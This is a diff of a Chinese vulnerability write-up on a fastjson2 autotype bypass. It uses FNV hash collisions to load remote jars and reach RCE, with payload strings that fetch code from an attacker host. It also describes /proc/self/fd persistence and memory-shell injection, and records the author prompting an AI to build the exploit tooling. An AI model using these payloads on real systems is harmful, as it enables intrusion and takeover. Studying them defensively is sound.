@@ -3,13 +3,13 @@
 
 ## 前置说明
 
-  
+
 参考: [https://mp.weixin.qq.com/s/LJaul1jNjK9pXRAkoUiMEA](https://mp.weixin.qq.com/s/LJaul1jNjK9pXRAkoUiMEA), 来跟进一下漏洞原理.  
-  
+
 测试使用的依赖:  
+
   
-  
-  
+
 ```
 <dependencies>
     <!-- fastjson2 核心 -->
@@ -20,16 +20,16 @@
     </dependency>
 </dependencies>
 ```
-  
+
   
 
 ## 默认场景
 
-  
+
 总结一下 FastJson2 下的 autotype 如何使用, 首先是指明第二个参数为一个 JavaBean 的场景, 传参不使用 autotype:  
+
   
-  
-  
+
 
 ```
 // ────────────────────────────────────────────────────────────
@@ -63,11 +63,11 @@ System.out.println();
 ```
 
   
-  
+
 当然如果使用带 @type 的场景, 如下:  
+
   
-  
-  
+
 
 ```
 String jsonWithType = "{\"@type\":\"com.heihu577.model.User\",\"name\":\"alice\",\"age\":25,\"email\":\"alice@lab.local\"}";
@@ -95,11 +95,11 @@ System.out.println();
 ```
 
   
-  
+
 默认会反序列化成com.alibaba.fastjson2.JSONObject类对象, 除非第二个参数指明为一个 JavaBean:  
+
   
-  
-  
+
 
 ```java
 User u2 = JSON.parseObject(jsonWithType, User.class);
@@ -118,26 +118,26 @@ System.out.println();
 
 ### 解析流程
 
-  
+
 根据当前解析结果来看, fastjson2 是能够正常解析@type字段的, 只不过若不指明第二个参数则会先被转化为JSONObject, 对原有的 JSON 对 User 类打上断点查看一番:  
-  
-  
-  
-
-![95c4a05c-be99-4587-af3b-91e6a68decfd.png](https://i.ibb.co/5XFmYKLp/cb9fe00d3c9b.png)
 
   
+
+
+![95c4a05c-be99-4587-af3b-91e6a68decfd.png](https://i.im.ge/QMVJGNh/p2m-7771053964.png)
+
   
+
 那么必然与 fastjson 1.x 的处理逻辑相同, 通过字节码编辑技术在内存中定义了字节码信息, 这里有两种思路定位到字节码文件:  
-  
+
 ●通过 arthas 将该类的字节码导出  
-  
+
 ●找到更深层次 ASM 操作部分, 将字节码写入到硬盘进行反编译  
-  
+
 通过思路 2, 最终调用栈如下:  
+
   
-  
-  
+
 
 ```java
 at com.alibaba.fastjson2.reader.ObjectReaderCreatorASM.jitObjectReader(ObjectReaderCreatorASM.java:594)
@@ -150,85 +150,85 @@ at com.heihu577.demo.Demo01Basic.main(Demo01Basic.java:17)
 ```
 
   
-  
+
 导出一波:  
-  
-  
-  
-
-![1bf88f69-0121-464c-987d-ac4ebed50e17.png](https://i.ibb.co/3yTSfDny/3e0213ed1be1.png)
 
   
+
+
+![1bf88f69-0121-464c-987d-ac4ebed50e17.png](https://i.im.ge/QMVJBS8/p2m-41bf4e5595.png)
+
   
+
 最终我们可以看到字节码信息:  
-  
-  
-  
-
-![efbdf9ee-7776-4885-9e48-8bfeee4516b8.png](https://i.ibb.co/99s4p6jc/c4b88b80065b.png)
 
   
+
+
+![efbdf9ee-7776-4885-9e48-8bfeee4516b8.png](https://i.im.ge/QMVJnJX/p2m-f83b800344.png)
+
   
+
 这里说明一下实验时失败的尝试（ASM 输出并没有携带行号信息导致无法 Debug）, 首先将导出出来的字节码符合包名结构, 保存到 jar 中:  
-  
-  
-  
-
-![dafa3b01-f783-402b-b46e-59f496e6d299.png](https://i.ibb.co/hFRJs3QS/c6372bd3238e.png)
 
   
+
+
+![dafa3b01-f783-402b-b46e-59f496e6d299.png](https://imglink.cc/cdn/TQ-fpnVdm4.png)
+
   
+
 随后增加 classpath, 并且将其置顶:  
-  
-  
+
   
 
-![42b9238b-cd2c-4ca7-8db5-bc1388b5887c.png](https://i.ibb.co/Y4RP4LNk/b212fd84590f.png)
+
+![42b9238b-cd2c-4ca7-8db5-bc1388b5887c.png](https://i.im.ge/QMVJJE9/p2m-8bd34a7c50.png)
 
 但是由于该字节码由 ASM 生成, 导致不存在行号信息, 可以安装: [https://github.com/Col-E/Recaf/releases/tag/4.0.0-alpha](https://github.com/Col-E/Recaf/releases/tag/4.0.0-alpha) 中的recaf-launcher-gui-0.8.8.jar来进行修复行号, 需要注意的是首次运行需要要求安装依赖库（javaFX 等）, 使用 proxychains4 运行该 jar 进行安装可加快速度. 但在实际场景中发现反编译存在错误信息:  
+
+
+![e4282e04-04bf-4e50-b5ec-1bfc3076e8bd.png](https://i.im.ge/QMVnlMC/p2m-5033ef47db.png)
+
   
 
-![e4282e04-04bf-4e50-b5ec-1bfc3076e8bd.png](https://i.ibb.co/7J4PwgVD/6cd28097c952.png)
-
-  
-  
 正常会调用该字节码的 readObject 方法, 并且整个 ASM 中不存在反射的逻辑:  
-  
-  
-  
-
-![1b1518ab-74f4-4a26-a11b-8f90ef443d86.png](https://i.ibb.co/RkbCq6wP/4554190541b2.png)
 
   
+
+
+![1b1518ab-74f4-4a26-a11b-8f90ef443d86.png](https://i.im.ge/QMVnQrY/p2m-3076ac6572.png)
+
   
+
 但部分方法会调用 checkAutoType:  
-  
-  
-  
-
-![4f43bffc-7b9e-4a38-a899-4f6fb0955563.png](https://i.ibb.co/bjbdv7km/956e9f6f4595.png)
 
   
+
+
+![4f43bffc-7b9e-4a38-a899-4f6fb0955563.png](https://i.im.ge/QMVJefM/p2m-27a1749590.png)
+
   
+
 
 ## RCE 场景
 
-  
+
 参考: [https://mp.weixin.qq.com/s/4jl2kv\_JRSDUAUZyc1jw5A](https://mp.weixin.qq.com/s/4jl2kv_JRSDUAUZyc1jw5A), 官网的 commit 记录中存在对 payload 的测试记录:  
-  
-  
-  
-
-![b5b3ca4b-df8e-45db-9908-075fbdefd7ec.png](https://i.ibb.co/RkJRnvBC/52cc63f5fbbd.png)
 
   
+
+
+![b5b3ca4b-df8e-45db-9908-075fbdefd7ec.png](https://i.im.ge/QMVnT5D/p2m-e8c387fbcb.png)
+
   
+
 可以看到期望类定义为了 Object, Debug 看一下:  
+
   
+
   
-  
-  
-  
+
 
 ```java
 package com.heihu577.demo;
@@ -247,11 +247,11 @@ public class Demo {
 ```
 
   
-  
+
 调用栈为:  
+
   
-  
-  
+
 
 ```java
 at com.alibaba.fastjson2.reader.ObjectReaderProvider.checkAutoType(ObjectReaderProvider.java:554)
@@ -263,29 +263,29 @@ at com.heihu577.demo.Demo.main(Demo.java:10)
 ```
 
   
-  
+
 可以看到这里并不是主动生成的 ASM, 当期望类指明为Object时而是系统提供的ObjectReaderImplObject类, 由provider.getObjectReader选择而来:  
-  
-  
-  
-
-![abc56426-51dd-4907-b865-168673fe89e4.png](https://i.ibb.co/G3M7qhBj/56b13aa8f212.png)
 
   
+
+
+![abc56426-51dd-4907-b865-168673fe89e4.png](https://i.im.ge/QMVnog4/p2m-d7d3a45c27.png)
+
   
+
 在ObjectReaderImplObject::readObject反序列化流程中会判断是否开启了 checkAutoType:  
-  
-  
-  
-
-![8b01895c-b5bd-4d02-b94f-279eafb5b1f6.png](https://i.ibb.co/wZQLkV1w/ae3f4c0bde08.png)
 
   
+
+
+![8b01895c-b5bd-4d02-b94f-279eafb5b1f6.png](https://i.im.ge/QMVnFJP/p2m-8274fecf88.png)
+
   
+
 随后经过调用栈:  
+
   
-  
-  
+
 
 ```java
 at com.alibaba.fastjson2.reader.ObjectReaderProvider.checkAutoType(ObjectReaderProvider.java:554)
@@ -297,42 +297,42 @@ at com.heihu577.demo.Demo.main(Demo.java:10)
 ```
 
   
-  
+
 可以看到能够正常走到checkAutoType方法中, 该方法中如果发现开启了 SafeMode 则直接 null（漏洞缓解措施, 默认不开启）:  
-  
-  
-  
-
-![5e0aa420-973a-4fa2-8376-eb7af088ca56.png](https://i.ibb.co/YT0sXdMS/47915d4d4111.png)
 
   
+
+
+![5e0aa420-973a-4fa2-8376-eb7af088ca56.png](https://i.im.ge/QMVnuEp/p2m-261a04ba7c.png)
+
   
+
 而后面的逻辑存在一个黑白名单校验的缺陷:  
-  
-  
+
   
 
-![bb1087af-b01f-4919-a6c2-ffa74baa294c.png](https://i.ibb.co/hJsSsZ2h/72d928600274.png)
+
+![bb1087af-b01f-4919-a6c2-ffa74baa294c.png](https://i.im.ge/QMVn2Nf/p2m-c175739e32.png)
 
 即使没有开启 autotype 功能, 同样会进入 hash 比较的逻辑, 那么如果这里的 hash 能够被暴力破解或其他手段猜测出来（由于这里 Hash 值的判断是根据结果进行判断，而过程中不同的字符参与异或|乘法运算是会存在冲突的结果的）, 那么则会进入 loadClass 逻辑:  
+
+
+![1f220816-5521-45e6-8bf6-cd2c6f22b688.png](https://i.im.ge/QMVn1d1/p2m-4cf44c4ba7.png)
+
   
 
-![1f220816-5521-45e6-8bf6-cd2c6f22b688.png](https://i.ibb.co/TDn50RXY/383da101a051.png)
-
-  
-  
 又是一段经典的 ClassLoader::loadClass, 与fastjson 1.2.83中的原理相同. 若该 ClassLoader 为 SpringBoot 的 URLClassLoader 即可进行远程类加载.  
-  
+
 
 ### hash 解密 & payload 调试
 
-  
+
 参考: [https://zhuanlan.zhihu.com/p/30548907](https://zhuanlan.zhihu.com/p/30548907) & [https://ctf-wiki.org/reverse/tools/constraint/z3/](https://ctf-wiki.org/reverse/tools/constraint/z3/) & [https://www.freebuf.com/articles/web/232002.html](https://www.freebuf.com/articles/web/232002.html)  
-  
+
 由于 FNV 算法使用了^= & \*=进行做位运算, 所以能列成方程组来解表达式:  
+
   
-  
-  
+
 
 ```python
 #!/usr/bin/env python3
@@ -524,11 +524,11 @@ if __name__ == '__main__':
 ```
 
   
-  
+
 对应方程组:  
+
   
-  
-  
+
 
 ```python
 已知:
@@ -547,36 +547,36 @@ if __name__ == '__main__':
 ```
 
 解方程核心代码块:  
-  
-  
-  
-
-![7ee9230b-8788-4f71-bae3-bcc95a1bb6ec.png](https://i.ibb.co/9HBBc3DR/76002f5e75b1.png)
 
   
+
+
+![7ee9230b-8788-4f71-bae3-bcc95a1bb6ec.png](https://imglink.cc/cdn/hMU9X-P1-Z.png)
+
   
+
 最终对应 fastjson 场景解密 -6293031534589903644 效果:  
-  
-  
-  
-
-![f65e13db-a03e-4de9-aa02-6e08e9b84338.png](https://i.ibb.co/GvfCmD5h/d7ab48446ea4.png)
 
   
+
+
+![f65e13db-a03e-4de9-aa02-6e08e9b84338.png](https://i.im.ge/QMVnDQT/p2m-b79f493f8b.png)
+
   
+
 通过解方程的形式成功达到 Hash 碰撞的效果, 那么在此基础之上我们只需要将我们在 fastjson 1.2.83 中的 payload 作为前缀即可. 以任意字符为前缀的话, 对于 fastjson 的计算来说仅仅是起点不同了:  
-  
-  
-  
-
-![de3f01f7-7cd5-4b8b-a33c-1d3d9e56a3a9.png](https://i.ibb.co/B2sLh1ZW/9a77a52f43e6.png)
 
   
+
+
+![de3f01f7-7cd5-4b8b-a33c-1d3d9e56a3a9.png](https://i.im.ge/QMVnSfm/p2m-acbed9c981.png)
+
   
+
 因为它是依次按照^= & \*=做位运算的, 丝毫不影响我们制作 payload, 定制 Python 脚本:  
+
   
-  
-  
+
 
 ```python
 #!/usr/bin/env python3
@@ -863,11 +863,11 @@ if __name__ == '__main__':
 ```
 
   
-  
+
 生成远程加载的 payload:  
+
   
-  
-  
+
 
 ```python
 heihu577 @ ~/Desktop ❯ python fnv_collision.py --prefix "jar:http:..2887610369.2333.Hello\!.Hello" -6293031534589903644
@@ -924,11 +924,11 @@ heihu577 @ ~/Desktop ❯ python fnv_collision.py --prefix "jar:http:..2887610369
 ```
 
   
-  
+
 该 payload 能成功走向 loadClass 逻辑:  
+
   
-  
-  
+
 
 ```java
 String jsonWithType = "{\"@type\":\"jar:http:..2887610369.2333.Hello!.Hello\\u4124\\u130a\\u789a\\u4bf1\\ufcf5\",\"name\":\"alice\",\"age\":25,\"email\":\"alice@lab.local\"}";
@@ -938,65 +938,65 @@ System.out.println(obj);
 ```
 
   
-  
+
 最终结果:  
-  
-  
-  
-
-![a7b4dea2-5b46-47c9-be42-46622c245c6a.png](https://i.ibb.co/JFb9GtS1/fe174e1c7c09.png)
 
   
+
+
+![a7b4dea2-5b46-47c9-be42-46622c245c6a.png](https://i.im.ge/QMVnqur/p2m-3c244997dc.png)
+
   
+
 
 ### SpringBoot 中测试
 
-  
+
 在 SpringBoot 中依旧能发送请求, 准备一个 SpringBoot 案例, 准备一个JSON.parseObject(可控,Object.class)可控端点即可.  
-  
+
 
 #### fnv 计算步骤
 
-  
+
 另外 Payload 使用 fastjson 1.2.83 的原有 payload 例如:  
+
   
-  
-  
+
 
 ```java
 jar:http:..2887610369:2333.Hello!.Hello
 ```
 
   
-  
+
 原封不动的将其丢到 fnv 计算器中:  
-  
-  
-  
-
-![b5d4f583-9b49-47bc-bbd7-b508246c966e.png](https://i.ibb.co/pBcV5ZhY/b3c139ef515f.png)
 
   
+
+
+![b5d4f583-9b49-47bc-bbd7-b508246c966e.png](https://i.im.ge/QMVns5W/p2m-f443846e78.png)
+
   
+
 生成结果为:  
+
   
-  
-  
+
 
 ```java
 jar:http:..2887610369:2333.Hello!.Hello\ue94c\uc17c\uf770\ua803\uc0d3
 ```
 
   
-  
+
 
 #### 驻留 jar 步骤
 
-  
+
 若想要在目标中驻留该 jar 包, 以维持后续的 fd 利用, 则需要 jar 包中已包含Hello\\ue94c\\uc17c\\uf770\\ua803\\uc0d3.class这个文件, 但该文件由于文件名称为 Unicode 编码, 使用编程的场景更加方便, 编写新 python 脚本配合 fnv 脚本使用:  
+
   
-  
-  
+
 
 ```python
 #!/usr/bin/env python3
@@ -1189,123 +1189,123 @@ if __name__ == '__main__':
 ```
 
   
-  
+
 最终结果:  
-  
-  
-  
-
-![1b89afac-0b2d-4146-b880-af329b0c4c63.png](https://i.ibb.co/tt96WTs/4291027d0aae.png)
 
   
+
+
+![1b89afac-0b2d-4146-b880-af329b0c4c63.png](https://i.im.ge/QMVna80/p2m-ed65a8b43a.png)
+
   
+
 当前仅是驻留到受害机 /proc/{pid}/fd 中案例, 先使用 0kb 的文件做测试:  
-  
-  
-  
-
-![图片.png](https://i.ibb.co/bcxJDxb/3098f6d4aae6.png)
 
   
+
+
+![图片.png](https://imglink.cc/cdn/AwCm5TnQjW.png)
+
   
+
 最终驻留成功.  
-  
+
 
 #### POC 调试 & 攻击案例
 
-  
+
 刚才的脚本仅仅是将jar 中的 class 文件名称符合传递的@type中的资源值, 若想要满足 RCE 还需要该 class 文件的内容（字节码）的类名同样带有 Unicode 编码. 此时对 AI 对我原 fastjson 1.2.83 的脚本进行说明了:  
+
   
-  
-  
+
 ```python
 我这里有一个项目：/Users/heihu577/Desktop/fastjson2/tools/fastjson-1.2.83-rce-jar-generator-1.0.1/GenJarBatch.java，你可以   阅读一波 README.md 文件之后，再看一波该 java 源码，现在我给你定义新的需求。新增：fnv_add_unicode_file 功能，对 cmd 或    
   defineClass 生成的 jar 文件进行分析。1: 分析出来 cmd 或 defineClass 生成的 jar 包，通过查看包名的形式能够定位到              fd0.Exception（假设生成的  class 文件是该结构，如果存在多个目录中存在 class 文件就依次进行如下操作），那么你可以通过 ASM   类库或者其他手段分析包名以及类名的结构来拼接为之前案例中的： python fnv_collision.py --prefix                              
   "jar:http:..2887610369:2333.Hello\!.Hello" -6293031534589903644 中的 --prefix 部分（可能是 jar:file:.proc.self.fd.数字!.   fd 数字.Exception）这种结构。2. 根据枚举出来的 包名类名结构，通过 python fnv_collision.py --prefix  "jar:http:..2887610369:2333.Hello\!.Hello" -6293031534589903644 该脚本的逻辑来进行计算（是根据逻辑，但你需要写出对应  
   java 模块的功能来使得与该 python 的结果一致才行），得到其后缀需要增加的 Unicode 码部分。3. 你已经知道了要增加什么 Unicode    编码之后，你需要将 Hello 类中的字节码中的类名部分进行修改（可以使用 asm 实现），修改为 “Hello+Unicode 值”，并且将该 class   文件加入到 jar 包中（文件名同样符合类名规律）。整个过程全部使用 java 语言，禁止 java 中嵌套 python。 
-```   
-  
+```
+
 坐等很长时间后, 又优化了一些细节:  
+
   
-  
-  
+
 
 ```python
 最后生成的 jar 包中，不是含有 class 文件吗，然后会输出：“jar:file:.proc.self.fd.256!.fd256.Exception醍눲䕹ᄬ憬”，我现在想让你把每次处理完毕的结果保存到"result.txt" 中。并且内容是：jar:file:.proc.self.fd.<NUM>!.fd<NUM>.Exception<Unicode 编码>，因为 fd 目录可能太多，然后你需要换行分割。
 ```
 
   
-  
+
 用于爆破时使用. 但外部 http 需要远程下载 jar 到 /proc/self/fd 中, 继续给 AI 思路:  
+
   
-  
-  
+
 
 ```python
 现在对原有的 cmd/defineClass 做一个变更，就是写入 jar 文件中的 1.class 文件，为命令行中指明的 host 和 port 名称，或者整个命令行也可以。
 ```
 
   
-  
+
 这是因为自己原编写的 fastjson 1.2.83 payload 的命令行参数存在攻击者 IP 和 PORT, 需要符合后续包名.  
+
   
-  
-  
+
 
 ```python
 让你做这一步，实际上是为了让你在 fnv_add_unicode_file 功能中增加两个需求：1. 解析 1.class 文件内容中的 ip 和 port 部分，组合为：jar:http:..<IP的10进制>:<IP的端口号>.<命令行中指明的文件名>!.1 2. 对组合结果进行 z3-fnv算法解方程，最后要拼接出：jar:http:..<IP的10进制>:<IP的端口号>.<命令行中指明的文件名>!.1<Unicode编码> 3. 拼接完成之后，在最终处理的 jar 包内增加这样一个真实文件，最最最后需要告诉用户首先使用该 payload 进行远程服务器下载。
 ```
 
 最终实现效果, 先是工具提示远程拉取:  
-  
-  
-  
-
-![573738ea-efc8-460a-99ff-ecb6eda2b69d.png](https://i.ibb.co/Zp3xzttz/72223aeb2fcb.png)
 
   
+
+
+![573738ea-efc8-460a-99ff-ecb6eda2b69d.png](https://i.im.ge/QMVnIIc/p2m-478d160810.png)
+
   
+
 随后是工具生成的 result.txt 进行爆破:  
-  
-  
-  
-
-![a822e005-77ce-4d25-a68e-51bafd390b33.png](https://i.ibb.co/cHTpXW3/5ffebf574ea5.png)
 
   
+
+
+![a822e005-77ce-4d25-a68e-51bafd390b33.png](https://imglink.cc/cdn/TEIrA0LNgZ.png)
+
   
+
 另外这里调教 AI 使用了 java 的 z3 实现解方程的效果.  
-  
+
 
 ##### 内存马注入
 
-  
+
 先是用工具生成 jar, 生成完毕之后进行转换为 FastJson2 版本, 等待 Hash 碰撞完整 jar:  
-  
-  
-  
-
-![7f3a91df-e50e-4da5-9517-b447f97a7be8.png](https://i.ibb.co/twMfQfqT/881154ba7009.png)
 
   
+
+
+![7f3a91df-e50e-4da5-9517-b447f97a7be8.png](https://imglink.cc/cdn/WjMCkbIpgu.png)
+
   
+
 最终结果:  
-  
-  
-  
-
-![图片.png](https://i.ibb.co/sdrrRTyF/3825801bf50c.png)
 
   
+
+
+![图片.png](https://i.im.ge/QMVnLxL/p2m-1b1d0ca38c.png)
+
   
+
 
 ## 其他语法
 
-  
+
 参考: [https://mp.weixin.qq.com/s/1niSP0dXlYql7euC5tMwPw](https://mp.weixin.qq.com/s/1niSP0dXlYql7euC5tMwPw) 师傅的两个姿势, 除了 JSON.parseObject 以外仍然可以通过:  
+
   
-  
-  
+
 
 ```python
 JSON.parseObject(可控,List.class)
@@ -1314,11 +1314,11 @@ JSON.parse(可控)
 ```
 
   
-  
+
 进行 RCE, 简单跟一下:  
+
   
-  
-  
+
 
 ```java
 String jsonWithType = "{\"@type\":\"jar:http:..2887610369.2333.Hello!.Hello\\u4124\\u130a\\u789a\\u4bf1\\ufcf5\",\"name\":\"alice\",\"age\":25,\"email\":\"alice@lab.local\"}";
@@ -1328,16 +1328,16 @@ System.out.println(obj);
 ```
 
   
+
+
+![1eef94c8-abd1-4fa6-a96b-42e17bdde27a.png](https://i.im.ge/QMVn0Pa/p2m-00330e26d6.png)
+
   
 
-![1eef94c8-abd1-4fa6-a96b-42e17bdde27a.png](https://i.ibb.co/mVk7zctZ/fdd5e6745113.png)
-
-  
-  
 以及:  
+
   
-  
-  
+
 
 ```java
 String jsonWithType = "{\"@type\":\"jar:http:..2887610369.2333.Hello!.Hello\\u4124\\u130a\\u789a\\u4bf1\\ufcf5\",\"name\":\"alice\",\"age\":25,\"email\":\"alice@lab.local\"}";
@@ -1345,14 +1345,14 @@ String jsonWithType = "{\"@type\":\"jar:http:..2887610369.2333.Hello!.Hello\\u41
 Object obj = JSON.parseObject(jsonWithType, Set.class);
 ```
 
-![e9c10b23-f713-4caf-a5c9-ab3490792764.png](https://i.ibb.co/23dmfmpp/ed8a5f6df09d.png)
+![e9c10b23-f713-4caf-a5c9-ab3490792764.png](https://i.im.ge/QMVnUJG/p2m-7f3cc42385.png)
 
   
-  
+
 以及:  
+
   
-  
-  
+
 
 ```java
 String jsonWithType = "[{\"@type\":\"jar:http:..2887610369.2333.Hello!.Hello\\u4124\\u130a\\u789a\\u4bf1\\ufcf5\",\"name\":\"alice\",\"age\":25,\"email\":\"alice@lab.local\"}]";
@@ -1362,29 +1362,29 @@ System.out.println(obj);
 ```
 
   
+
+
+![07bf767e-feb0-4b96-89c0-7d868e03622b.png](https://i.im.ge/QMVnidx/p2m-5c30ce5805.png)
+
   
 
-![07bf767e-feb0-4b96-89c0-7d868e03622b.png](https://i.ibb.co/1JhWNBgd/70c115ef590b.png)
-
-  
-  
 相对于 JSON.parse 来说, 多了一步选择器的操作:  
-  
-  
-  
-
-![adf17043-6a29-4ae2-8df6-5b6c01e3029d.png](https://i.ibb.co/x8LS4Lrn/25febf05f1c0.png)
 
   
+
+
+![adf17043-6a29-4ae2-8df6-5b6c01e3029d.png](https://i.im.ge/QMVn5fJ/p2m-bcf4003c56.png)
+
   
+
 
 ### 其他补充
 
-  
+
 往上找一下看还有哪些语法能够调用该方法的 readObject, 查找了一番有如下类:  
+
   
-  
-  
+
 
 ```java
 JSON.parseObject(jsonWithType, Collection.class);
@@ -1398,7 +1398,7 @@ JSON.parseObject(jsonWithType, Object[].class);
 ```
 
 规律参考:  
-  
+
 
 | 子类 | 类型 |
 | --- | --- |
@@ -1406,10 +1406,10 @@ JSON.parseObject(jsonWithType, Object[].class);
 | Queue/Deque 系 | Queue, Deque, AbstractSequentialList, LinkedList, ConcurrentLinkedDeque, ConcurrentLinkedQueue, CopyOnWriteArrayList |
 | Set 系 | Set, AbstractSet, EnumSet, NavigableSet, SortedSet, ConcurrentSkipListSet, LinkedHashSet, HashSet, TreeSet |
 
-  
+
 可能还有更多 parseObject 手法可打.  
+
   
-  
-  
+
 
 ## Ending...
